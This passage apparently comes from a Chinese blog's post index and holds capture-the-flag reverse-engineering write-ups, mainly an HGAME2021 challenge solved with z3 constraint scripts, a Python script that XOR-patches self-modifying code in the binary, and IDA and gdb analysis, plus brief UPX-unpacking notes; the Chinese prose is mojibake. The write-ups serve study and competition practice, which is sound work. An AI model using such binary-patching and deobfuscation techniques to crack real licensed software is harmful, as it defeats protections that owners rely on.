-18 * f[2] + 23 * f[20] + -20 * f[14] + 64 * f[19] + 91 * f[5] - 6 * f[7] + 84 * f[3] - 6 * f[34] + 69 * f[21] - 4 * f[23] - 80 * f[0] == 23824) s.add(89 * f[11] + 61 * f[7] + -92 * f[31] + 99 * f[21] + 27 * f[16] + -48 * f[24] + -51 * f[4] + -39 * f[25] + 84 * f[30] + 34 * f[14] + -73 * f[17] + -92 * f[18] + 72 * f[2] - 14 * f[13] - f[19] + 2 * f[9] + 3 * f[29] - 61 * f[33] - 6 * f[26] - 57 * f[15] - 8 * f[27] + -28 * f[35] + -72 * f[6] + -46 * f[32] + 99 * f[20] + -69 * f[22] + -94 * f[12] + -35 * f[8] + -29 * f[0] - 29 * f[10] - 2 * f[23] - 23 * f[34] + 41 * f[3] + 42 * f[28] == -13865) s.add(62 * f[25] + 85 * f[8] + -66 * f[32] + 43 * f[10] + 32 * f[33] + 75 * f[34] + 44 * f[1] + 49 * f[28] + -21 * f[26] + 60 * f[4] + -40 * f[0] + -98 * f[15] + -37 * f[9] + 78 * f[16] + 96 * f[35] - 84 * f[18] - 2 * f[7] + 43 * f[2] - 28 * f[6] - 77 * f[3] - 30 * f[17] + 90 * f[19] + 58 * f[30] + 74 * f[12] + 22 * f[29] + -29 * f[20] + -49 * f[22] + 88 * f[14] + -51 * f[24] + 44 * f[21] + 28 * f[13] - 95 * f[5] + 5 * f[23] + 85 * f[31] + 5 * f[27] + 47 * f[11] == 50179) s.add(-100 * f[25] + -88 * f[18] + 46 * f[33] + 50 * f[31] + -85 * f[4] + -92 * f[6] + -54 * f[7] + 83 * f[23] + -25 * f[24] + -91 * f[5] + 85 * f[10] + -15 * f[16] - 59 * f[27] - 91 * f[8] + 73 * f[32] + 44 * f[19] + 5 * f[34] + 68 * f[14] - 32 * f[21] - 26 * f[30] - 56 * f[17] + 30 * f[1] + -92 * f[26] + 4 * f[29] + -89 * f[20] + 57 * f[15] + -66 * f[0] + -85 * f[12] + 91 * f[35] + -68 * f[2] - 95 * f[3] - 16 * f[13] - 76 * f[11] - 48 * f[9] - 88 * f[22] + 65 * f[28] == -75429) s.add(-49 * f[20] + -71 * f[13] + -23 * f[23] + -19 * f[21] + 62 * f[2] + -41 * f[19] + 46 * f[15] + 5 * f[1] + -2 * f[5] + 88 * f[9] + 84 * f[16] + 77 * f[6] - 6 * f[26] + 51 * f[33] - 96 * f[31] + 59 * f[14] - 62 * f[8] - 55 * f[25] - 32 * f[34] + 69 * f[32] - 48 * f[28] + 85 * f[30] + -35 * f[24] + -58 * f[18] + 16 * f[12] + -45 * f[7] + 49 * f[35] + 8 * f[11] + 54 * f[22] + -33 * f[4] + 4 * f[17] - 21 * f[27] + 31 * f[0] - 98 * f[10] - 96 * f[29] - 71 * f[3] == -18764) s.add(74 * f[20] + -50 * f[2] + -46 * f[21] + 28 * f[15] + -100 * f[5] + 53 * f[28] + -93 * f[9] + -69 * f[1] + -61 * f[0] + 26 * f[8] + -66 * f[6] + -66 * f[27] - 42 * f[4] + 89 * f[33] - 30 * f[31] - 45 * f[22] + 13 * f[14] - 29 * f[3] + 33 * f[10] + 54 * f[23] + 18 * f[30] + 88 * f[12] + 84 * f[34] + 66 * f[24] + 99 * f[16] + -78 * f[32] + -88 * f[11] + -21 * f[35] + 25 * f[18] + -81 * f[19] - 39 * f[29] + 15 * f[13] + 83 * f[26] - 28 * f[7] + 2 * f[25] == -20428) s.add(-97 * f[22] + 14 * f[33] + -43 * f[11] + 40 * f[20] + 31 * f[13] + 44 * f[29] + -68 * f[3] + -36 * f[1] + -38 * f[9] + -7 * f[12] + f[26] + -50 * f[6] + 59 * f[8] + 88 * f[30] + 46 * f[0] - 34 * f[15] + 10 * f[4] + 84 * f[18] + 13 * f[7] + 14 * f[25] - 5 * f[16] + 10 * f[31] + 64 * f[28] + 97 * f[5] + -7 * f[27] + 62 * f[14] + 60 * f[24] + 27 * f[34] + -11 * f[10] - 31 * f[32] - 48 * f[19] - 55 * f[35] - 96 * f[2] - 83 * f[23] == 11973) s.add(-99 * f[4] + -57 * f[8] + 2 * f[7] + 57 * f[24] + -54 * f[25] + 39 * f[29] + -91 * f[1] + -32 * f[20] + -30 * f[11] + 16 * f[12] + 45 * f[17] + 90 * f[32] + 26 * f[5] - 59 * f[28] + 7 * f[2] - 88 * f[3] + 36 * f[15] - 73 * f[6] - 6 * f[27] + 99 * f[13] - 96 * f[0] + -45 * f[26] + -10 * f[35] + -40 * f[9] + 97 * f[10] + 6 * f[22] + 58 * f[34] + 4 * f[31] + 55 * f[21] - 72 * f[16] + 27 * f[19] + 79 * f[23] - 28 * f[18] - 90 * f[30] - 6 * f[33] + 58 * f[14] == -23186) if s.check() == sat: model = s.model() for i in range(36): print (chr(model[f[i]].as_long().real), end=\u0026#39;\u0026#39;) print (\u0026#39;\\nfinish\u0026#39;) å¾—åˆ°ç»“æœ\nhgame{@_FAKE_flag!_do_Y0u_know_SMC?} æäº¤ä¸€ä¸‹å‘ç°ä¸æ­£ç¡®ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªå‡flagï¼Œæç¤ºæˆ‘ä»¬è¿™é“é¢˜ä½¿ç”¨äº†SMCï¼ˆself-modifying codeï¼‰\nstep 1ï¼šæ‰¾åˆ°SMCä½ç½®å’ŒåŠ å¯†æ–¹æ³• æ—¢ç„¶å¯¹æŸä¸€ä¸ªç‰‡æ®µè¿›è¡Œäº†åŠ å¯†ï¼Œè¯´æ˜ç¨‹åºä¸­è‚¯å®šæœ‰ä¸€éƒ¨åˆ†ä¹±ç ï¼ˆæˆ–è€…é€»è¾‘æ··ä¹±çš„æ±‡ç¼–ä»£ç ï¼‰\nåœ¨0x409080å¤„æ‰¾åˆ°ä¸€å¤§æ®µæ•°å­—\näº¤å‰å¼•ç”¨ä¸€ä¸‹ï¼Œå®šä½åˆ°è´Ÿè´£åŠ å¯†ä»£ç 40699B\nå‘ç°æ˜¯ä¸€ä¸ªç®€å•å¼‚æˆ–ï¼Œç”¨åˆšæ‰æ‰¾åˆ°çš„ä¸€é•¿ä¸²æ–¹ç¨‹çš„é‚£ä¸ªå‡½æ•°ä¸è¿™æ®µä¹±ç è¿›è¡Œé€ä½å¼‚æˆ–\nstep 2ï¼šç ´è§£SMC æ¥ä¸‹æ¥æ‰‹åŠ¨patchä¸€ä¸‹\nåœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ä¸¤æ®µä»£ç çš„ä½ç½®ï¼Œè¿›è¡Œå¼‚æˆ–ï¼Œä¸Šç½‘æ‰¾ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¿®æ”¹çš„ä»£ç \nfile_path = \u0026#34;FAKE\u0026#34; fr = open(file_path, \u0026#34;rb\u0026#34;) fw = open(\u0026#39;modify_\u0026#39;+file_path, \u0026#34;wb\u0026#34;) data = fr.read() fw.write(data) fw.seek(0x1216) fw.write(b\u0026#39;\\xf3\\x0f\\x1e\\xfa\\x55\\x48\\x89\\xe5\\x48\\x81\\xec\\x60\\x01\\x00\\x00\\x48\u0026#39; ) fw.write(b\u0026#39;\\x89\\xbd\\x28\\xfe\\xff\\xff\\x48\\x8d\\x95\\x50\\xff\\xff\\xff\\xb8\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\xb9\\x12\\x00\\x00\\x00\\x48\\x89\\xd7\\xf3\\x48\\xab\\xc7\\x85\\xc0\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\xf6\\xd6\\x00\\x00\\xc7\\x85\\xc4\\xfe\\xff\\xff\\xa7\\xee\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\xc8\\xfe\\xff\\xff\\xf7\\xea\\x00\\x00\\xc7\\x85\\xcc\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x9f\\xdf\\x00\\x00\\xc7\\x85\\xd0\\xfe\\xff\\xff\\xcc\\xdd\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\xd4\\xfe\\xff\\xff\\xae\\xd9\\x00\\x00\\xc7\\x85\\xd8\\xfe\\xff\\xff\\x32\u0026#39; ) fw.write(b\u0026#39;\\xb6\\x00\\x00\\xc7\\x85\\xdc\\xfe\\xff\\xff\\xc3\\xce\\x00\\x00\\xc7\\x85\\xe0\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x4c\\xd1\\x00\\x00\\xc7\\x85\\xe4\\xfe\\xff\\xff\\x05\\xc5\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\xe8\\xfe\\xff\\xff\\x8e\\xc3\\x00\\x00\\xc7\\x85\\xec\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x9a\\xac\\x00\\x00\\xc7\\x85\\xf0\\xfe\\xff\\xff\\x6d\\xaf\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\xf4\\xfe\\xff\\xff\\x9a\\xb5\\x00\\x00\\xc7\\x85\\xf8\\xfe\\xff\\xff\\xc8\u0026#39; ) fw.write(b\u0026#39;\\xb3\\x00\\x00\\xc7\\x85\\xfc\\xfe\\xff\\xff\\x3b\\xad\\x00\\x00\\xc7\\x85\\x00\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\x4a\\xab\\x00\\x00\\xc7\\x85\\x04\\xff\\xff\\xff\\x50\\xad\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x08\\xff\\xff\\xff\\xce\\xd6\\x00\\x00\\xc7\\x85\\x0c\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\xbc\\xf1\\x00\\x00\\xc7\\x85\\x10\\xff\\xff\\xff\\x12\\xef\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x14\\xff\\xff\\xff\\x1b\\xe3\\x00\\x00\\xc7\\x85\\x18\\xff\\xff\\xff\\x82\u0026#39; ) fw.write(b\u0026#39;\\xe1\\x00\\x00\\xc7\\x85\\x1c\\xff\\xff\\xff\\xb4\\xd6\\x00\\x00\\xc7\\x85\\x20\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\xd1\\xbe\\x00\\x00\\xc7\\x85\\x24\\xff\\xff\\xff\\x52\\xc7\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x28\\xff\\xff\\xff\\xdd\\xc1\\x00\\x00\\xc7\\x85\\x2c\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x5b\\xbc\\x00\\x00\\xc7\\x85\\x30\\xff\\xff\\xff\\x20\\xbb\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x34\\xff\\xff\\xff\\x87\\xc6\\x00\\x00\\xc7\\x85\\x38\\xff\\xff\\xff\\x04\u0026#39; ) fw.write(b\u0026#39;\\xb6\\x00\\x00\\xc7\\x85\\x3c\\xff\\xff\\xff\\x55\\xc5\\x00\\x00\\xc7\\x85\\x40\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\x25\\xbd\\x00\\x00\\xc7\\x85\\x44\\xff\\xff\\xff\\x3f\\xb4\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x48\\xff\\xff\\xff\\x16\\xb4\\x00\\x00\\xc7\\x85\\x4c\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x98\\xb6\\x00\\x00\\xc7\\x85\\x30\\xfe\\xff\\xff\\x68\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x34\\xfe\\xff\\xff\\x67\\x00\\x00\\x00\\xc7\\x85\\x38\\xfe\\xff\\xff\\x61\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x3c\\xfe\\xff\\xff\\x6d\\x00\\x00\\x00\\xc7\\x85\\x40\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x65\\x00\\x00\\x00\\xc7\\x85\\x44\\xfe\\xff\\xff\\x7b\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x48\\xfe\\xff\\xff\\x40\\x00\\x00\\x00\\xc7\\x85\\x4c\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\x50\\xfe\\xff\\xff\\x46\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x54\\xfe\\xff\\xff\\x41\\x00\\x00\\x00\\xc7\\x85\\x58\\xfe\\xff\\xff\\x4b\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x5c\\xfe\\xff\\xff\\x45\\x00\\x00\\x00\\xc7\\x85\\x60\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\x64\\xfe\\xff\\xff\\x66\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x68\\xfe\\xff\\xff\\x6c\\x00\\x00\\x00\\xc7\\x85\\x6c\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x61\\x00\\x00\\x00\\xc7\\x85\\x70\\xfe\\xff\\xff\\x67\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x74\\xfe\\xff\\xff\\x21\\x00\\x00\\x00\\xc7\\x85\\x78\\xfe\\xff\\xff\\x2d\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x7c\\xfe\\xff\\xff\\x64\\x00\\x00\\x00\\xc7\\x85\\x80\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x6f\\x00\\x00\\x00\\xc7\\x85\\x84\\xfe\\xff\\xff\\x5f\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x88\\xfe\\xff\\xff\\x59\\x00\\x00\\x00\\xc7\\x85\\x8c\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x30\\x00\\x00\\x00\\xc7\\x85\\x90\\xfe\\xff\\xff\\x75\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x94\\xfe\\xff\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\x98\\xfe\\xff\\xff\\x6b\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x9c\\xfe\\xff\\xff\\x6f\\x00\\x00\\x00\\xc7\\x85\\xa0\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x6e\\x00\\x00\\x00\\xc7\\x85\\xa4\\xfe\\xff\\xff\\x77\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\xa8\\xfe\\xff\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\xac\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x53\\x00\\x00\\x00\\xc7\\x85\\xb0\\xfe\\xff\\xff\\x4d\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\xb4\\xfe\\xff\\xff\\x43\\x00\\x00\\x00\\xc7\\x85\\xb8\\xfe\\xff\\xff\\x3f\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\xbc\\xfe\\xff\\xff\\x7d\\x00\\x00\\x00\\xc7\\x45\\xfc\u0026#39; ) fw.write(b\u0026#39;\\x01\\x00\\x00\\x00\\xc7\\x45\\xf8\\x00\\x00\\x00\\x00\\xe9\\xb9\\x00\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\xc7\\x45\\xf4\\x00\\x00\\x00\\x00\\xe9\\x9f\\x00\\x00\\x00\\xc7\\x45\\xf0\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xe9\\x85\\x00\\x00\\x00\\x8b\\x55\\xf8\\x89\\xd0\\x01\\xc0\\x01\u0026#39; ) fw.write(b\u0026#39;\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xf4\\x01\\xd0\\x48\\x98\\x8b\\xb4\\x85\\x50\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\x8b\\x55\\xf8\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\u0026#39; ) fw.write(b\u0026#39;\\x8b\\x45\\xf0\\x01\\xd0\\x48\\x98\\x48\\x8d\\x14\\x85\\x00\\x00\\x00\\x00\\x48\u0026#39; ) fw.write(b\u0026#39;\\x8b\\x85\\x28\\xfe\\xff\\xff\\x48\\x01\\xd0\\x8b\\x00\\x89\\xc1\\x8b\\x55\\xf0\u0026#39; ) fw.write(b\u0026#39;\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xf4\\x01\\xd0\\x48\u0026#39; ) fw.write(b\u0026#39;\\x98\\x8b\\x84\\x85\\x30\\xfe\\xff\\xff\\x0f\\xaf\\xc8\\x8b\\x55\\xf8\\x89\\xd0\u0026#39; ) fw.write(b\u0026#39;\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xf4\\x01\\xd0\\x8d\\x14\\x0e\u0026#39; ) fw.write(b\u0026#39;\\x48\\x98\\x89\\x94\\x85\\x50\\xff\\xff\\xff\\x83\\x45\\xf0\\x01\\x83\\x7d\\xf0\u0026#39; ) fw.write(b\u0026#39;\\x05\\x0f\\x8e\\x71\\xff\\xff\\xff\\x83\\x45\\xf4\\x01\\x83\\x7d\\xf4\\x05\\x0f\u0026#39; ) fw.write(b\u0026#39;\\x8e\\x57\\xff\\xff\\xff\\x83\\x45\\xf8\\x01\\x83\\x7d\\xf8\\x05\\x0f\\x8e\\x3d\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\xc7\\x45\\xec\\x00\\x00\\x00\\x00\\xeb\\x58\\xc7\\x45\\xe8\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xeb\\x45\\x8b\\x55\\xec\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\u0026#39; ) fw.write(b\u0026#39;\\x89\\xc2\\x8b\\x45\\xe8\\x01\\xd0\\x48\\x98\\x8b\\x8c\\x85\\x50\\xff\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\x8b\\x55\\xec\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xe8\u0026#39; ) fw.write(b\u0026#39;\\x01\\xd0\\x48\\x98\\x8b\\x84\\x85\\xc0\\xfe\\xff\\xff\\x39\\xc1\\x74\\x07\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x45\\xfc\\x00\\x00\\x00\\x00\\x83\\x45\\xe8\\x01\\x83\\x7d\\xe8\\x05\\x7e\\xb5\u0026#39; ) fw.write(b\u0026#39;\\x83\\x45\\xec\\x01\\x83\\x7d\\xec\\x05\\x7e\\xa2\\x8b\\x45\\xfc\\xc9\\xc3\\x45\u0026#39; ) fw.write(b\u0026#39;\\xec\\x38\\xc3\\xc0\\x38\\x8b\\x00\\x01\u0026#39;) fw.flush() fw.close() fr.close() step 3ï¼šæŸ¥çœ‹ä¿®æ”¹åçš„ä»£ç  ä½¿ç”¨ida64æ‰“å¼€ä¿®æ”¹åçš„æ–‡ä»¶\n__int64 __usercall sub_401216@\u0026lt;rax\u0026gt;(__int64 a1@\u0026lt;rbp\u0026gt;, __int64 a2@\u0026lt;rdi\u0026gt;) { v54 = a1; *(\u0026amp;v54 - 59) = a2; memset(\u0026amp;v47, 0, 0x90uLL); v11 = 55030; v12 = 61095; v13 = 60151; v14 = 57247; v15 = 56780; v16 = 55726; v17 = 46642; v18 = 52931; v19 = 53580; v20 = 50437; v21 = 50062; v22 = 44186; v23 = 44909; v24 = 46490; v25 = 46024; v26 = 44347; v27 = 43850; v28 = 44368; v29 = 54990; v30 = 61884; v31 = 61202; v32 = 58139; v33 = 57730; v34 = 54964; v35 = 48849; v36 = 51026; v37 = 49629; v38 = 48219; v39 = 47904; v40 = 50823; v41 = 46596; v42 = 50517; v43 = 48421; v44 = 46143; v45 = 46102; v46 = 46744; *((_DWORD *)\u0026amp;v54 - 116) = 104; *((_DWORD *)\u0026amp;v54 - 115) = 103; *((_DWORD *)\u0026amp;v54 - 114) = 97; *((_DWORD *)\u0026amp;v54 - 113) = 109; *((_DWORD *)\u0026amp;v54 - 112) = 101; *((_DWORD *)\u0026amp;v54 - 111) = 123; *((_DWORD *)\u0026amp;v54 - 110) = 64; *((_DWORD *)\u0026amp;v54 - 109) = 95; *((_DWORD *)\u0026amp;v54 - 108) = 70; *((_DWORD *)\u0026amp;v54 - 107) = 65; *((_DWORD *)\u0026amp;v54 - 106) = 75; *((_DWORD *)\u0026amp;v54 - 105) = 69; *((_DWORD *)\u0026amp;v54 - 104) = 95; *((_DWORD *)\u0026amp;v54 - 103) = 102; *((_DWORD *)\u0026amp;v54 - 102) = 108; *((_DWORD *)\u0026amp;v54 - 101) = 97; *((_DWORD *)\u0026amp;v54 - 100) = 103; *((_DWORD *)\u0026amp;v54 - 99) = 33; *((_DWORD *)\u0026amp;v54 - 98) = 45; *((_DWORD *)\u0026amp;v54 - 97) = 100; *((_DWORD *)\u0026amp;v54 - 96) = 111; *((_DWORD *)\u0026amp;v54 - 95) = 95; *((_DWORD *)\u0026amp;v54 - 94) = 89; *((_DWORD *)\u0026amp;v54 - 93) = 48; *((_DWORD *)\u0026amp;v54 - 92) = 117; *((_DWORD *)\u0026amp;v54 - 91) = 95; *((_DWORD *)\u0026amp;v54 - 90) = 107; *((_DWORD *)\u0026amp;v54 - 89) = 111; v3 = 110; v4 = 119; v5 = 95; v6 = 83; v7 = 77; v8 = 67; v9 = 63; v10 = 125; v53 = 1; for ( i = 0; i \u0026lt;= 5; ++i ) { for ( j = 0; j \u0026lt;= 5; ++j ) { for ( k = 0; k \u0026lt;= 5; ++k ) *((_DWORD *)\u0026amp;v54 + 6 * i + j - 44) += *((_DWORD *)\u0026amp;v54 + 6 * k + j - 116) * *(_DWORD *)(4LL * (6 * i + k) + *(\u0026amp;v54 - 59));// çŸ©é˜µä¹˜æ³• } } for ( l = 0; l \u0026lt;= 5; ++l ) { for ( m = 0; m \u0026lt;= 5; ++m ) { if ( *((_DWORD *)\u0026amp;v54 + 6 * l + m - 44) != *((_DWORD *)\u0026amp;v54 + 6 * l + m - 80) )// ä¸v11åˆ°v46æ¯”è¾ƒ v53 = 0; } } return v53; } å‘ç°åˆ¤æ–­å‡½æ•°å‘ç”Ÿäº†å˜åŒ–\nç¬¬ä¸€ä¸ªä¸‰é‡å¾ªç¯æ˜æ˜¾æ˜¯ä¸€ä¸ªçŸ©é˜µä¹˜æ³•ï¼Œç¬¬äºŒä¸ªåˆ™æ˜¯ç®€å•æ¯”è¾ƒï¼Œç”±äºè¿™é‡ŒæŒ‡é’ˆæœ‰ç‚¹ç»•ï¼Œä½¿ç”¨äº†gdbå¯¹æ¯ä¸€é¡¹è¿›è¡Œäº†åˆ¤æ–­\né¦–å…ˆåœ¨ç¬¬äºŒä¸ªå¾ªç¯æ‰“æ–­ç‚¹\n.text:00000000004015FB loc_4015FB: ; CODE XREF: sub_401216+42Eâ†“j .text:00000000004015FB mov edx, [rbp-14h] .text:00000000004015FE mov eax, edx .text:0000000000401600 add eax, eax .text:0000000000401602 add eax, edx .text:0000000000401604 add eax, eax .text:0000000000401606 mov edx, eax .text:0000000000401608 mov eax, [rbp-18h] .text:000000000040160B add eax, edx .text:000000000040160D cdqe .text:000000000040160F mov ecx, [rbp+rax*4-0B0h] .text:0000000000401616 mov edx, [rbp-14h] .text:0000000000401619 mov eax, edx .text:000000000040161B add eax, eax .text:000000000040161D add eax, edx .text:000000000040161F add eax, eax .text:0000000000401621 mov edx, eax .text:0000000000401623 mov eax, [rbp-18h] .text:0000000000401626 add eax, edx .text:0000000000401628 cdqe .text:000000000040162A mov eax, [rbp+rax*4-140h] .text:0000000000401631 cmp ecx, eax .text:0000000000401633 jz short loc_40163C .text:0000000000401635 mov dword ptr [rbp-4], 0 åœ¨cmpå‘½ä»¤å¤„æ‰“æ–­ç‚¹ï¼ŒæŸ¥çœ‹ecxå’Œeaxå¯„å­˜å™¨çš„å€¼ï¼Œå‘ç°æ˜¯æ‹¿è®¡ç®—ç»“æœå’Œv11-v46è¿›è¡Œæ¯”è¾ƒ\néšåæŸ¥çœ‹ç¬¬ä¸€ä¸ªå¤§å¾ªç¯ï¼Œå…³é”®ç‚¹æ˜¾ç„¶æ˜¯ä¹˜æ³•\n.text:000000000040159E imul ecx, eax æ‰“ä¸Šæ–­ç‚¹åï¼Œå‘ç°æ˜¯æ‹¿è¾“å…¥çš„6*6çŸ©é˜µå’Œ104-125è¿™æ®µç”±36ä¸ªæ•°å­—æ„æˆçš„çŸ©é˜µè¿›è¡Œä¹˜æ³•\nstep 4ï¼šè¿›è¡Œæ±‚è§£ æ‰€ä»¥æ¥ä¸‹æ¥åªéœ€è¦æ±‚è§£çŸ©é˜µå³å¯ï¼Œè¿™é‡Œè¿˜æ˜¯ä½¿ç”¨äº†z3\nfrom z3 import * s = Solver() f = [ Int(\u0026#39;f%d\u0026#39; % i) for i in range(36) ] for i in range(36): s.add(f[i] \u0026gt; 0x20) s.add(f[i] \u0026lt; 0x7f) s.add(f[ 0] == ord(\u0026#39;h\u0026#39;)) s.add(f[ 1] == ord(\u0026#39;g\u0026#39;)) s.add(f[ 2] == ord(\u0026#39;a\u0026#39;)) s.add(f[ 3] == ord(\u0026#39;m\u0026#39;)) s.add(f[ 4] == ord(\u0026#39;e\u0026#39;)) s.add(f[ 5] == ord(\u0026#39;{\u0026#39;)) s.add(f[35] == ord(\u0026#39;}\u0026#39;)) a = [104, 103, 97, 109, 101, 123, 64, 95, 70, 65, 75, 69, 95, 102, 108, 97, 103, 33, 45, 100, 111, 95, 89, 48, 117, 95, 107, 111, 110, 119, 95, 83, 77, 67, 63, 125] for c in a: print(chr(c), end=\u0026#39;\u0026#39;) print() ans = [55030, 61095, 60151, 57247, 56780, 55726, 46642, 52931, 53580, 50437, 50062, 44186, 44909, 46490, 46024, 44347, 43850, 44368, 54990, 61884, 61202, 58139, 57730, 54964, 48849, 51026, 49629, 48219, 47904, 50823, 46596, 50517, 48421, 46143, 46102, 46744] for i in range(6): for j in range(6): s.add(f[6 * i] * a[j] + f[6 * i + 1] * a[6 + j] + f[6 * i + 2] * a[12 + j] + f[6 * i + 3] * a[18 + j] + f[6 * i + 4] * a[24 + j] + f[6 * i + 5] * a[30 + j] == ans[6 * i + j]) if s.check() == sat: model = s.model() for i in range(36): print (chr(model[f[i]].as_long().real), end=\u0026#39;\u0026#39;) print(\u0026#39;\\nfinish\u0026#39;) # hgame{E@sy_Se1f-Modifying_C0oodee33} ","date":"2021-03-17T20:06:09Z","permalink":"/post/hgame2021-vernam-and-fake/","title":"HGAME2021 Vernam and FAKE"},{"content":"å†…æ¶µçš„è½¯ä»¶ é¦–å…ˆä½¿ç”¨fileå‘½ä»¤ï¼Œå‘ç°exeæ˜¯32ä½çš„ï¼Œå°†å…¶æ‹–å…¥idaä¸­\nè¿›å…¥mainå‡½æ•°\nç‚¹å‡»è¿›å…¥main0å‡½æ•°\nå¯ä»¥çœ‹åˆ°ä¸€ä¸²v2å­—ç¬¦ä¸²\nç»“åˆç¨‹åºè¿è¡Œæ—¶å‡ºç°çš„æ–‡å­—ï¼šâ€è¿™é‡Œæœ¬æ¥åº”è¯¥æ˜¯ç­”æ¡ˆçš„â€œ\nçŒœæµ‹v2å°±æ˜¯ç­”æ¡ˆ\nç›´æ¥æäº¤\nå‘ç°ä¸å¯¹\nå°†å¼€å¤´ä¿®æ”¹ä¸ºflag\næäº¤åç›´æ¥é€šè¿‡\næ–°å¹´å¿«ä¹ é¦–å…ˆä½¿ç”¨fileå‘½ä»¤æŸ¥çœ‹exeæ–‡ä»¶ä¿¡æ¯ï¼Œå‘ç°æ˜¯32ä½\nå°è¯•è¿è¡Œå‘ç°æ˜¯è¦æ±‚è¾“å…¥flag\næ‹–å…¥idaè¿›è¡Œé™æ€åˆ†æ\nå‘ç°åªæœ‰ä¸€ä¸ªstartå‡½æ•°ï¼Œidaå„ç§æŠ¥é”™ï¼Œæ— æ³•åˆ†æ\nçŒœæµ‹ä½¿ç”¨äº†upxå£³\nä½¿ç”¨exeinfopeè½¯ä»¶è¿›è¡ŒæŸ¥çœ‹ï¼Œupxå£³å®é”¤\nè„±å£³åå†æ¬¡æ‹–å…¥ida\nå‘ç°v4ä¸º\u0026quot;HappyNewYear!\u0026quot;\nå¯¹äºè¾“å…¥v5ï¼Œç›´æ¥ä¸v4è¿›è¡Œstrncmpçš„æ¯”è¾ƒ\nå› æ­¤åªéœ€è¦ä¸v4ç›¸åŒå³å¯\nå°è¯•åå‘ç°æ²¡é—®é¢˜\nå¥—ä¸Šflagæäº¤\næˆåŠŸ\nguessgame ä½¿ç”¨è½¯ä»¶ï¼Œå‘ç°æ˜¯ä¸€ä¸ªçŒœæ•°æ¸¸æˆ\næ‹–å…¥idaåˆ†æ\nå‘ç°æ•´ä¸ªä»£ç 